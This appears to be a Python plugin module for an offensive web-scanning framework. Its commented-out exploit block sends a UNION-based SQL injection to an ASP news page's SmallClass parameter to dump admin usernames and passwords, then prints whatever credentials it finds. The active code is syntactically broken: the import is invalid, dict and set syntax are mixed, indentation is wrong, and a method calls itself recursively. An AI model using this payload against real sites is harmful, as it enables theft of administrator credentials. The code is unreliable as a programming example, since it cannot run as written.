# -*- coding: cp936 -*-
'''
Demo modules for ass_hole_hunter
Reprouct from mst
'''
#from libs.functions import *
import modules.*


class hunter_plugin:
    '''main_scan'''
    infos = {
        'plugin_name':'main_scan module',
        'author':'demon',
        'update':'2015/04/17',
        'site':'http://www.dawner.info',
        }
    opts  = {
        'dic','/data/tmp/url.txt or N',
        'ping_type':'ping or read',
        'url':'192.168.1.254 or default',
        }
'''
If you have enter the path of the dic file, not enter "N",you
needn't to enter url in the end.
urls need to add port if exsit.

Use "-c" parameter can use this module.
'''
    def exploit(self):
    '''start exploit'''
        hunter = hunter_plugin(ip="192.168.10.103",port=23)
        hunter.exploit()


#        if RPORT == '443':
#            url = 'https://%s%s'%(RURL,RPATH)
#        else:
#            url = 'http://%s:%s%s'%(RURL,RPORT,RPATH)
#        exp = url+"NewsType.asp?SmallClass='%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20''='"
#        color.cprint("[*] Sending exp..",YELLOW)
#        ok  = fuck.urlget(exp)
#        if ok.getcode() == 200:
#            tmp=fuck.find('[>]+\w+[|]+\w+[<]+',ok.read())
#            if len(tmp)>0:
#                color.cprint("[*] Exploit Successful !",GREEN)
#                i=1
#                for res in tmp:
#                    res=res[1:len(res)-1]
#                    color.cprint("[%s] %s"%(i,res),GREEN)
#                    i+=1
#            else:
#                color.cprint("[!] TARGET NO VULNERABLE !",RED)
#        else:
#            color.cprint("[!] EXPLOIT FALSE ! CODE:%s"%ok.getcode(),RED)
